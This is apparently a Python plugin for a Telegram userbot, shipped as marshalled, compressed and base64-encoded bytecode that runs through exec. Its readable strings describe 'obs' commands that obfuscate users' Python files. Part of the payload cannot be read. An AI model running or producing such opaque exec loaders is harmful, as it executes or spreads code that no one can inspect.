
import marshal
import sys

version = sys.version_info

try:
    if version >= (3, 10) and version < (3, 11):
        obfuscated_code = b'c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00sB\x00\x00\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02d\x02Z\x03e\x01\xa0\x04e\x03\xa1\x01Z\x05e\x02\xa0\x06e\x05\xa1\x01Z\x07e\x08e\x00\xa0\te\x07\xa1\x01\x83\x01\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Na\x8c\x0b\x00\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)\n\xda\x07marshal\xda\x06base64\xda\x04zlib\xda\x0cencoded_code\xda\tb64decode\xda\x0cdecoded_code\xda\ndecompress\xda\x11decompressed_code\xda\x04exec\xda\x05loads\xa9\x00r\x0b\x00\x00\x00r\x0b\x00\x00\x00\xfa\tobsult.py\xda\x08<module>\x01\x00\x00\x00s\n\x00\x00\x00\x18\x01\x04\x02\n\x01\n\x01\x12\x01'
    elif version >= (3, 9) and version < (3, 10):
        obfuscated_code = b'c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00@\x00\x00\x00s\xa8\x00\x00\x00d\x00Z\x00d\x01d\x02l\x01Z\x01d\x01d\x02l\x02Z\x02d\x01d\x02l\x03Z\x03d\x01d\x02l\x04Z\x04d\x03d\x04l\x05T\x00z\x10d\x03d\x05l\x05m\x06Z\x07\x01\x00W\x00n\x1e\x04\x00e\x08yZ\x01\x00\x01\x00\x01\x00d\x03d\x06l\x05m\tZ\x07\x01\x00Y\x00n\x020\x00e\x07d\x07d\x08\x8d\x01d\td\n\x84\x00\x83\x01Z\ne\x07d\x0bd\x08\x8d\x01d\x0cd\r\x84\x00\x83\x01Z\x0be\x0c\xa0\re\x0e\xa0\x0fd\x0e\xa1\x01d\x03\x19\x00\x9b\x00e\x00j\x10e\x11d\x0f\x8d\x01\x9b\x00i\x01\xa1\x01\x01\x00d\x02S\x00)\x10u\x9c\x00\x00\x00\nS\xe1\xb4\x9c\xe1\xb4\x8b\xe1\xb4\x9c\xc9\xb4\xe1\xb4\x80s O\xca\x99\xd2\x93\xe1\xb4\x9cs\xe1\xb4\x84\xe1\xb4\x80\xe1\xb4\x9b\xe1\xb4\x87\xca\x80\n\n\xe2\x9b\xa7 Commands Available\n\xe2\x80\xa2 `{i}obs` `name.py` < Optional\n\n\xe2\x80\xa2 `{i}obs2` `name.py` < Optional\n\nRun obs2 after obs\n\xe9\x00\x00\x00\x00N\xe9\x01\x00\x00\x00)\x01\xda\x01*)\x01\xda\x0bultroid_cmd)\x01\xda\nnimbus_cmdz\x0cobs( (.*)|$))\x01\xda\x07patternc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x08\x00\x00\x00\xc3\x00\x00\x00s\xb4\x01\x00\x00|\x00j\x00\xa0\x01d\x01\xa1\x01}\x01|\x01r\x18|\x01\xa0\x02\xa1\x00n\x02d\x00}\x02|\x00j\x03\x90\x01r\xa0|\x00\xa0\x04\xa1\x00I\x00d\x00H\x00}\x03|\x03\x90\x01r\x8e|\x03j\x05\x90\x01r\x8et\x06|\x03j\x05d\x02\x83\x02\x90\x01r\x8e|\x00j\x07\xa0\x08|\x03j\x05j\t\xa1\x01I\x00d\x00H\x00}\x04|\x03j\x05j\tj\nr~|\x03j\x05j\tj\nd\x03\x19\x00j\x0bn\x02d\x04}\x05|\x02r\xa0|\x02\xa0\x0cd\x05\xa1\x01r\x94|\x02n\x08|\x02\x9b\x00d\x05\x9d\x02}\x02n\x04|\x05}\x02t\r|\x04d\x06\x83\x02\x8f\x18}\x06|\x06\xa0\x0e\xa1\x00}\x07W\x00d\x00\x04\x00\x04\x00\x83\x03\x01\x00n\x101\x00s\xcc0\x00\x01\x00\x01\x00\x01\x00Y\x00\x01\x00t\x0fd\x07\x83\x01D\x00]>}\x08t\x10|\x07|\x04d\x08\x83\x03}\tt\x11\xa0\x12|\t\xa1\x01}\nt\x13\xa0\x14|\n\xa1\x01}\x0bt\x15\xa0\x16|\x0b\xa1\x01\xa0\x17\xa1\x00}\x0cd\t|\x0c\x9b\x00d\n\x9d\x03}\x07q\xded\x0b|\x02\x9b\x00\x9d\x02}\rt\r|\rd\x0c\x83\x02\x8f\x1a}\x0e|\x0e\xa0\x18|\x07\xa1\x01\x01\x00W\x00d\x00\x04\x00\x04\x00\x83\x03\x01\x00n\x121\x00\x90\x01sT0\x00\x01\x00\x01\x00\x01\x00Y\x00\x01\x00|\x00j\x07j\x19|\x00j\x1a|\rd\rd\x0e\x8d\x03I\x00d\x00H\x00\x01\x00t\x1b\xa0\x1c|\r\xa1\x01\x01\x00t\x1b\xa0\x1c|\x04\xa1\x01\x01\x00n\x10|\x00\xa0\x1dd\x0f\xa1\x01I\x00d\x00H\x00\x01\x00n\x10|\x00\xa0\x1dd\x0f\xa1\x01I\x00d\x00H\x00\x01\x00d\x00S\x00)\x10N\xe9\x02\x00\x00\x00\xda\x08documentr\x00\x00\x00\x00\xfa\x12obfuscated_code.py\xfa\x03.py\xda\x01r\xe9\x04\x00\x00\x00\xda\x04execz/\nimport marshal, base64, zlib\n\nencoded_code = "z\x89"\ndecoded_code = base64.b64decode(encoded_code)\ndecompressed_code = zlib.decompress(decoded_code)\nexec(marshal.loads(decompressed_code))\n\xfa\x14resources/downloads/\xda\x01w\xfa\x1cHere is the obfuscated file.\xa9\x01\xda\x07caption\xfa0Please reply to a message containing a document.)\x1e\xda\rpattern_match\xda\x05group\xda\x05strip\xda\x0freply_to_msg_id\xda\x11get_reply_message\xda\x05media\xda\x07hasattr\xda\x06client\xda\x0edownload_mediar\x07\x00\x00\x00\xda\nattributes\xda\tfile_name\xda\x08endswith\xda\x04open\xda\x04read\xda\x05range\xda\x07compile\xda\x07marshal\xda\x05dumps\xda\x04zlib\xda\x08compress\xda\x06base64\xda\tb64encode\xda\x06decode\xda\x05write\xda\tsend_file\xda\x07chat_id\xda\x02os\xda\x06remove\xda\x05reply)\x0f\xda\x05event\xda\x0ccommand_args\xda\rnew_file_name\xda\x07message\xda\tfile_path\xda\x12original_file_name\xda\roriginal_file\xda\roriginal_code\xda\x01_\xda\rcompiled_code\xda\x0fmarshalled_code\xda\x0fcompressed_code\xda\x0cencoded_code\xda\rnew_file_path\xda\x08new_file\xa9\x00r?\x00\x00\x00\xfa\tobsult.py\xda\x11tripple_obfuscate\x18\x00\x00\x00sH\x00\x00\x00\x00\x04\x0c\x01\x10\x02\x08\x01\x0e\x01\x1c\x01\x16\x04\x08\xff\x12\x02\x02\xfd\x02\x06\x04\x03\x08\xff\x06\x02\x08\xfd\x04\x06\x04\x02\x0c\x01&\x02\x0c\x01\x0c\x01\n\x01\n\x01\x0e\x01\x02\x03\x02\xfd\n\t\n\x01\x0c\x01*\x02\x06\x01\x08\xff\x0c\x04\n\x01\x0c\x02\x12\x02rA\x00\x00\x00z\robs2( (.*)|$)c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x0b\x00\x00\x00\xc3\x00\x00\x00sZ\x01\x00\x00|\x00j\x00\xa0\x01d\x01\xa1\x01}\x01|\x01r\x18|\x01\xa0\x02\xa1\x00n\x02d\x00}\x02|\x00j\x03\x90\x01rF|\x00\xa0\x04\xa1\x00I\x00d\x00H\x00}\x03|\x03\x90\x01r4|\x03j\x05\x90\x01r4t\x06|\x03j\x05d\x02\x83\x02\x90\x01r4|\x00j\x07\xa0\x08|\x03j\x05j\t\xa1\x01I\x00d\x00H\x00}\x04|\x03j\x05j\tj\nr~|\x03j\x05j\tj\nd\x03\x19\x00j\x0bn\x02d\x04}\x05|\x02r\xa0|\x02\xa0\x0cd\x05\xa1\x01r\x94|\x02n\x08|\x02\x9b\x00d\x05\x9d\x02}\x02n\x04|\x05}\x02d\x06|\x02\x9b\x00\x9d\x02}\x06t\r|\x06d\x07\x83\x02\x8f<}\x07|\x07\xa0\x0ed\x08t\x0ft\x10\xa0\x11t\x12t\r|\x04\x83\x01\xa0\x13\xa1\x00|\x04d\t\x83\x03\xa1\x01\x83\x01\x9b\x00d\n\x9d\x03\xa1\x01\x01\x00W\x00d\x00\x04\x00\x04\x00\x83\x03\x01\x00n\x101\x00s\xfa0\x00\x01\x00\x01\x00\x01\x00Y\x00\x01\x00|\x00j\x07j\x14|\x00j\x15|\x06d\x0bd\x0c\x8d\x03I\x00d\x00H\x00\x01\x00t\x16\xa0\x17|\x06\xa1\x01\x01\x00t\x16\xa0\x17|\x04\xa1\x01\x01\x00n\x10|\x00\xa0\x18d\r\xa1\x01I\x00d\x00H\x00\x01\x00n\x10|\x00\xa0\x18d\r\xa1\x01I\x00d\x00H\x00\x01\x00d\x00S\x00)\x0eNr\x06\x00\x00\x00r\x07\x00\x00\x00r\x00\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\r\x00\x00\x00r\x0e\x00\x00\x00z#\nimport marshal\n\nobfuscated_code = r\x0c\x00\x00\x00zD\n\n\nloaded_code = marshal.loads(obfuscated_code)\n\n\nexec(loaded_code)\nr\x0f\x00\x00\x00r\x10\x00\x00\x00r\x12\x00\x00\x00)\x19r\x13\x00\x00\x00r\x14\x00\x00\x00r\x15\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00r\x18\x00\x00\x00r\x19\x00\x00\x00r\x1a\x00\x00\x00r\x1b\x00\x00\x00r\x07\x00\x00\x00r\x1c\x00\x00\x00r\x1d\x00\x00\x00r\x1e\x00\x00\x00r\x1f\x00\x00\x00r*\x00\x00\x00\xda\x04reprr#\x00\x00\x00r$\x00\x00\x00r"\x00\x00\x00r \x00\x00\x00r+\x00\x00\x00r,\x00\x00\x00r-\x00\x00\x00r.\x00\x00\x00r/\x00\x00\x00)\x08r0\x00\x00\x00r1\x00\x00\x00r2\x00\x00\x00r3\x00\x00\x00r4\x00\x00\x00r5\x00\x00\x00r=\x00\x00\x00r>\x00\x00\x00r?\x00\x00\x00r?\x00\x00\x00r@\x00\x00\x00\xda\x16download_and_obfuscateT\x00\x00\x00s<\x00\x00\x00\x00\x04\x0c\x01\x10\x02\x08\x01\x0e\x01\x1c\x01\x16\x04\x08\xff\x12\x02\x02\xfd\x02\x05\x04\x03\x08\xff\x06\x02\x08\xfd\x04\x06\x04\x02\n\x01\x0c\x01\x04\x01\x02\x01\x1c\xff\x06\xff"\x07\x06\x01\x08\xff\x0c\x03\n\x01\x0c\x02\x12\x02rC\x00\x00\x00\xda\x01.)\x01\xda\x01i)\x12\xda\x07__doc__r\'\x00\x00\x00r#\x00\x00\x00r-\x00\x00\x00r%\x00\x00\x00\xda\x00r\x03\x00\x00\x00Z\x08obfs_cmd\xda\x0bImportErrorr\x04\x00\x00\x00rA\x00\x00\x00rC\x00\x00\x00\xda\x04HELP\xda\x06update\xda\x08__name__\xda\x05split\xda\x06format\xda\x05HNDLRr?\x00\x00\x00r?\x00\x00\x00r?\x00\x00\x00r@\x00\x00\x00\xda\x08<module>\x01\x00\x00\x00s$\x00\x00\x00\x04\x0b\x08\x01\x08\x01\x08\x01\x08\x02\x08\x02\x02\x01\x10\x01\x0c\x01\x12\x02\x02\x01\x02\xff\x04\x03\n9\x02\x01\x02\xff\x04\x03\n*'
    loaded_code = marshal.loads(obfuscated_code)

except Exception as er:
    raise er

exec(loaded_code)